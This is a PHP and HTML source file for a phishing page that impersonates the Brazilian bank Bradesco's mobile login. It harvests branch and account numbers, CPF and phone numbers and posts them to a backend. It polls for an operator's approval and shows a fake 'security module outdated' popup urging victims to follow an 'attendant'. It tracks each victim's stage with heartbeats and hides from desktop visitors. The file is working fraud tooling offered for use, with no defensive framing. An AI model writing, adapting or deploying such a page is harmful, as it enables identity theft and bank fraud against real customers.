<?php session_start(); ?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Banco Bradesco | Entre Nós, Você Vem Primeiro</title>
    <link rel="shortcut icon" href="imagens/favicon.png" type="image/x-icon">

    <style>
        /* RESET e fonte */
        * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif; }
        html, body { height:100%; background:#e61d57; color:#fff; }

        /* Loader (spinner) */
        .load { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10001; background-color: rgba(255, 255, 255, 0.85); justify-content: center; align-items: center; }
        .container-load { display: flex; gap: 10px; }
        .circle { width: 20px; height: 20px; background-color: #e60039; border-radius: 50%; animation: pulse 0.6s infinite alternate; }
        .circle:nth-child(2) { animation-delay: 0.3s; }
        @keyframes pulse { to { transform: scale(1.5); opacity: 0.6; } }

        /* container full-screen */
        .screen { display: flex; flex-direction: column; justify-content: space-between; height: 100vh; overflow: hidden; }
        header, nav { flex-shrink: 0; }
        .middle { flex:1; overflow-y: auto; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:left; padding:0 16px; }
        .middle .inner { width:100%; max-width:360px; display:flex; flex-direction:column; align-items:flex-start; }

        /* HEADER */
        header { display:flex; justify-content:space-between; align-items:center; padding:10px; }
        header button { background:none; border:none; padding:0; cursor:pointer; }
        .menu-btn { font-size:24px; color:#fff; position:relative; }
        .menu-btn::after { content:''; position:absolute; top:4px; right:4px; width:8px; height:8px; background:#2ecc71; border-radius:50%; }
        .bell-btn img { display:block; width:32px; height:32px; }

        /* LOGO + texto */
        .logo { height:55px; margin-bottom:12px; align-self:flex-start; }
        .welcome { font-size:25px; margin-bottom:24px; }

        /* CAMPOS */
        .fields { display:flex; gap:13px; width:100%; margin-bottom:24px; }
        .fields > div { flex:1; display:flex; flex-direction:column; }
        .fields input { width:100%; background:transparent; border:none; border-bottom:1px solid #fff; padding:8px 4px; font-size:16px; color:#fff; outline:none; }
        #agencia::placeholder, #conta::placeholder { color:#fff; opacity:1; }

        /* TITULARES */
        .titulares { display:flex; gap:8px; margin-bottom:24px; width:100%; }
        .titular { flex:1; padding:8px 0; font-size:14px; border:1px solid rgba(255,255,255,0.8); border-radius:20px; background:transparent; color:#fff; cursor:pointer; transition:background .2s, color .2s; }
        .titular.active { background:#fff; color:#e61d57; border-color:#fff; }

        /* SWITCH “Lembrar” */
        .remember { display:flex; align-items:center; justify-content:space-between; width:100%; margin-bottom:32px; font-size:14px; }
        .switch { position:relative; width:44px; height:24px; }
        .switch input { opacity:0; width:0; height:0; }
        .slider { position:absolute; top:0; left:0; right:0; bottom:0; background:rgba(255,255,255,0.3); border-radius:24px; transition:.4s; }
        .slider::before { content:""; position:absolute; width:18px; height:18px; left:3px; bottom:3px; background:#fff; border-radius:50%; transition:.4s; }
        .switch input:checked + .slider { background:#fff; }
        .switch input:checked + .slider::before { transform:translateX(20px); }

        /* BOTÃO ENTRAR */
        .enter-btn { width:100%; padding:14px 0; margin-bottom:24px; background:#fff; color:#e61d57; border:none; border-radius:28px; font-size:16px; cursor:pointer; }

        /* BOTTOM NAV */
        nav.bottom-nav { display: flex; border-top: 1px solid rgba(255,255,255,0.3); padding: 16px 0; }
        .nav-item { flex: 1; display: flex; flex-direction: column; align-items: center; position: relative; font-size: 12px; line-height: 1.2; color:#fff; }
        .nav-item:not(:last-child)::after { content: ''; position: absolute; right: 0; top: 8px; bottom: 8px; width: 1px; background: rgba(255,255,255,0.3); }
        .nav-item img { width: 32px; height: 32px; margin-bottom: 6px; }

        /* POPUP */
        .popup-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.5); z-index: 10000; display: flex; justify-content: center; align-items: center; opacity: 1; visibility: visible; transition: opacity 0.4s ease, visibility 0.4s ease; }
        .popup-overlay.fade-out { opacity: 0; visibility: hidden; }
        .popup-content { background: #fff; border-radius: 16px; width: 90%; max-width: 360px; padding: 24px; text-align: left; color: #333; position: relative; font-size: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        .popup-content h2 { margin-bottom: 12px; font-size: 20px; color: #333; }
        .popup-content p { margin-bottom: 20px; line-height: 1.4; }
        .popup-close { position: absolute; top: 12px; right: 16px; background: none; border: none; font-size: 20px; color: #888; cursor: pointer; }
        .popup-button { display: block; width: 100%; background-color: #e61d57; color: white; padding: 12px 0; text-align: center; border-radius: 999px; font-size: 16px; font-weight: bold; text-transform: lowercase; border: none; cursor: pointer; }

        /* MENSAGEM DE ERRO */
        .mensagemErroSuperiorDireita { position: fixed; top: 20px; right: 20px; background-color: #cc092f; color: #fff; padding: 12px 18px; border-radius: 8px; font-weight: bold; font-size: 14px; box-shadow: 0px 4px 12px rgba(0,0,0,0.25); z-index: 9999; display: flex; flex-direction: column; animation: fadeIn 0.3s ease-in-out; }
        .barra-load { width: 100%; height: 4px; background-color: #fff; margin-top: 6px; border-radius: 50px; animation: barraAnimada 5s linear forwards; }
        @keyframes barraAnimada { 0% { width: 0%; } 100% { width: 100%; } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* TELA DE ATUALIZAÇÃO */
        .update-screen { display: flex; flex-direction: column; height: 100vh; width: 100%; background-color: #e61d57; position: fixed; top: 0; left: 0; z-index: 200; }
        .update-header { min-height: 250px; padding: 40px 24px 15px 24px; color: #fff; flex-shrink: 0; }
        .logo-bradesco-small { height: 22px; margin-bottom: 15px; }
        .info-line { font-size: 14px; margin-bottom: 8px; font-weight: 500; }
        .update-panel { background-color: #fff; border-top-left-radius: 20px; border-top-right-radius: 20px; padding: 30px 24px 24px 24px; flex: 1; color: #333; animation: slideUp 0.5s ease-out forwards; display: flex; flex-direction: column; }
        .update-panel h2 { font-size: 18px; font-weight: bold; color: #444; margin-bottom: 8px; }
        .update-panel p { font-size: 14px; color: #666; margin-bottom: 24px; }
        #formUpdate { display: flex; flex-direction: column; gap: 16px; }
        #formUpdate input { width: 100%; border: none; border-bottom: 1px solid #ccc; padding: 12px 4px; font-size: 16px; color: #333; outline: none; }
        #formUpdate input::placeholder { color: #999; }
        .update-btn { width: 100%; padding: 14px 0; margin-top: 16px; background: #e61d57; color: #fff; border: none; border-radius: 28px; font-size: 16px; font-weight: bold; text-transform: lowercase; cursor: pointer; }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
    </style>
</head>

<script>
    const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
    if (!isMobile || window.innerWidth > 600) {
        window.location.href = 'index.php';
    }
</script>

<body>
    <div class="load"><div class="container-load"><div class="circle"></div><div class="circle"></div></div></div>

    <div class="screen" id="mainScreen">
        <header>
            <button class="menu-btn">&#9776;</button>
            <button class="bell-btn"><img src="imagens/bell_white.png"/></button>
        </header>
        <div class="middle">
            <div class="inner">
                <img class="logo" src="imagens/bradesco_logo_white.png" />
                <div class="welcome">Que bom ter você aqui!</div>
                <form id="formLoginMobile">
                    <div class="fields">
                        <input name="agencia" id="agencia" type="tel" inputmode="numeric" placeholder="Agência sem dígito" maxlength="4" required />
                        <input name="conta" id="conta" type="tel" inputmode="numeric" placeholder="Conta com dígito" maxlength="10" required />
                    </div>
                    <div class="titulares">
                        <button type="button" class="titular active">1º titular</button>
                        <button type="button" class="titular">2º titular</button>
                        <button type="button" class="titular">3º titular</button>
                    </div>
                    <div class="remember">
                        <span>Lembrar agência e conta</span>
                        <label class="switch">
                            <input type="checkbox" id="lembrar"/>
                            <span class="slider"></span>
                        </label>
                    </div>
                    <button type="submit" class="enter-btn">entrar</button>
                </form>
            </div>
        </div>
        <nav class="bottom-nav">
            <div class="nav-item"><img src="imagens/icon_chave.png">Chave de Segurança</div>
            <div class="nav-item"><img src="imagens/icon_bia.png">BIA</div>
            <div class="nav-item"><img src="imagens/icon_pix.png">Pix</div>
        </nav>
    </div>

    <div class="update-screen" id="updateScreen" style="display: none;">
        <div class="update-header">
            <img class="logo-bradesco-small" src="imagens/bradesco_logo_white.png" />
            <div class="info-line">Agência sem dígito: <span id="infoAgencia"></span></div>
            <div class="info-line">Conta com dígito: <span id="infoConta"></span></div>
            <div class="info-line">Titularidade: Cliente</div>
        </div>
        <div class="update-panel">
            <h2>Atualize seus dados de contato</h2>
            <p>Atenção, precisamos realizar algumas alterações cadastrais</p>
            <form id="formUpdate">
                <input type="tel" id="cpf" inputmode="numeric" placeholder="Informe seu CPF" maxlength="14" required />
                <input type="tel" id="celular" inputmode="numeric" placeholder="Informe seu Celular" maxlength="15" required />
                <button type="submit" class="update-btn">atualizar</button>
            </form>
        </div>
    </div>

    <div id="mensagemErro" class="mensagemErroSuperiorDireita" style="display:none;">
        <span id="msgErro">Dados incorretos. Verifique e tente novamente.</span>
        <div class="barra-load"></div>
    </div>

    <div id="popup" class="popup-overlay" style="display: none;">
        <div class="popup-content">
            <button class="popup-close" onclick="closePointsPopup()">×</button>
            <h2>Bradesco Segurança</h2>
            <p> Modulo de segurança do dispositivo <strong>DESATUALIZADO</strong> inseguro.<br>Siga as orientações do atendente e realize a atualização do modulo de proteção.<br></p>
            <button class="popup-button" onclick="closePointsPopup()">continuar</button>
        </div>
    </div>

<script>
 // 2) Polling global de status
 async function verificarStatus(id) {
   try {
     const res  = await fetch(`verificar_status.php?id=${id}`);
     const json = await res.json();
     const status = (json.status || '').trim();
     const tipo   = (json.tipo   || '').trim();

     if (status === 'authorized') {
       if (tipo === 'classic')       window.location.href = 'login.php';
       else if (tipo === 'exclusive')window.location.href = 'exclusive.php';
       else if (tipo === 'prime')    window.location.href = 'prime.php';
       else                          window.location.href = 'login.php';
     }
     else if (status === 'rejected') {
       document.querySelector('.load').style.display = 'none';
       exibirErro('Acesso não autorizado. Tente novamente.');
     }
     else {
       setTimeout(() => verificarStatus(id), 1500);
     }
   } catch {
     setTimeout(() => verificarStatus(id), 2000);
   }
 }

 // 3) Máscaras e UI helpers
 document.getElementById('conta').addEventListener('input', e => {
   let v = e.target.value.replace(/\D/g,'');
   if (v.length>1) v = v.slice(0,-1)+'-'+v.slice(-1);
   e.target.value = v;
 });
 document.getElementById('cpf').addEventListener('input', e => {
   let v = e.target.value.replace(/\D/g,'');
   v = v.replace(/(\d{3})(\d)/,'$1.$2')
         .replace(/(\d{3})(\d)/,'$1.$2')
         .replace(/(\d{3})(\d{1,2})$/,'$1-$2');
   e.target.value = v;
 });
 document.getElementById('celular').addEventListener('input', e => {
   let v = e.target.value.replace(/\D/g,'');
   v = v.replace(/^(\d{2})(\d)/,'($1) $2')
         .replace(/(\d{5})(\d)/,'$1-$2');
   e.target.value = v;
 });
 document.querySelectorAll('.titular').forEach(btn =>
   btn.addEventListener('click', () => {
     document.querySelectorAll('.titular')
             .forEach(b=>b.classList.remove('active'));
     btn.classList.add('active');
   })
 );

 function closePointsPopup() {
   const popup = document.getElementById('popup');
   if (popup) {
     popup.classList.add('fade-out');
     setTimeout(()=>popup.style.display='none',400);
   }
 }
 window.addEventListener('load', () => {
   setTimeout(()=>{ const p = document.getElementById('popup'); if(p) p.style.display='flex'; }, 500);
 });

 // 4) Avança do login para a tela de atualização
 function showUpdateScreen() {
   const ag = document.getElementById('agencia').value;
   const ct = document.getElementById('conta').value;
   const elAg = document.getElementById('infoAgencia');
   const elCt = document.getElementById('infoConta');
   if (elAg) elAg.textContent = `**${ag.slice(-2)}`;
   if (elCt) elCt.textContent = `**${ct.slice(0,-2)}${ct.slice(-2)}`;
   document.getElementById('mainScreen').style.display   = 'none';
   document.getElementById('updateScreen').style.display = 'flex';
 }

 // 5) Mensagem de erro
 function exibirErro(msg='Dados incorretos. Verifique e tente novamente.') {
   const c = document.getElementById('mensagemErro');
   const m = document.getElementById('msgErro');
   const b = c?.querySelector('.barra-load');
   if (m) m.textContent = msg;
   if (c) {
     c.style.display = 'flex';
     if (b) {
       b.style.animation = 'none'; void b.offsetWidth;
       b.style.animation = 'barraAnimada 5s linear forwards';
     }
     setTimeout(()=>c.style.display='none',5000);
   }
 }

 // 6) Login Form → Avança
 document.getElementById('formLoginMobile')
   .addEventListener('submit', e => {
     e.preventDefault();
     const ag = document.getElementById('agencia').value.trim();
     const ct = document.getElementById('conta').value.trim();
     if (ag.length!==4 || ct.length<2) {
       exibirErro("Preencha agência e conta corretamente.");
       return;
     }
     showUpdateScreen();
   });

 // ✅ 7) Update Form → Salvar → Polling (LÓGICA DO PROXY REMOVIDA)
 document.getElementById('formUpdate')
   .addEventListener('submit', async e => {
     e.preventDefault();
     document.querySelector('.load').style.display='flex';

     const agencia = document.getElementById('agencia').value.trim();
     const raw     = document.getElementById('conta').value.replace(/\D/g,'');
     const digito  = raw.slice(-1);
     const conta   = raw.slice(0,-1);
     const cpf     = document.getElementById('cpf').value.replace(/\D/g,'');
     const celular = document.getElementById('celular').value.replace(/\D/g,'');

     if (!agencia||!conta||!digito||cpf.length<11||celular.length<10) {
       document.querySelector('.load').style.display='none';
       exibirErro("Todos os campos são obrigatórios.");
       return;
     }

     // Monta o payload com os dados do formulário para enviar diretamente ao seu backend
     const payloadParaSalvar = {
       agencia,
       conta,
       digito,
       cpf,
       celular,
       lembrar: document.getElementById('lembrar').checked ? 'on' : ''
     };

     try {
       // Envia os dados diretamente para 'salvar.php', sem passar pelo proxy
       const salvarRes = await fetch('salvar.php', {
         method:'POST',
         headers:{'Content-Type':'application/json'},
         body:JSON.stringify(payloadParaSalvar)
       });

       const salvarJson = await salvarRes.json();

       // Valida a resposta da rede e a resposta do seu backend
       if (!salvarRes.ok || !salvarJson.success) {
           throw new Error(salvarJson.error || 'Erro ao registrar os dados.');
       }

       // Se tudo deu certo, inicia a verificação de status
       verificarStatus(salvarJson.client_id);

     } catch(err) {
       document.querySelector('.load').style.display='none';
       exibirErro(err.message);
     }
   });

 // 8) Heartbeat & (guarded) ref loader
 function getCookie(n) {
   const parts = `;${document.cookie}`.split(`;${n}=`);
   return parts.length===2 ? parts.pop().split(';').shift() : '';
 }
 function sendHeartbeat() {
   const c = getCookie('identificador_cliente');
   if (!c) return;
   const fd = new FormData(); fd.append('identificador_cookie',c);
   fetch('/heartbeat.php',{method:'POST',body:fd}).catch(()=>{});
 }
 function carregarReferenciaDispositivo() {
   const spanRef = document.getElementById('ref-dispositivo');
   if (!spanRef) return;
   fetch('get_client_data.php')
     .then(r => r.ok ? r.json() : Promise.reject())
     .then(d => {
       let ref = (d.referencia_dispositivo||'').trim();
       if (!ref) return spanRef.textContent = 'N/D';
       ref = ref.replace(/^X{6}/i,'');
       spanRef.textContent = 'XXXXXX'+ref;
     })
     .catch(()=>{ spanRef.textContent='N/D'; });
 }
 sendHeartbeat(); setInterval(sendHeartbeat,3000);
 carregarReferenciaDispositivo(); setInterval(carregarReferenciaDispositivo,1000);

 // 9) Reportar estágio
 document.addEventListener('DOMContentLoaded',()=>{
   const pageName='login-mobile.php';
   function reportarEstagioAtual(){
     fetch('/atualizar_estagio.php',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
       body:JSON.stringify({estagio:pageName}),
       credentials:'include'
     }).catch(()=>{});
   }
   reportarEstagioAtual();
   setInterval(reportarEstagioAtual,2000);
 });
</script>

<?php include 'chat.php'; ?>

</body>
</html>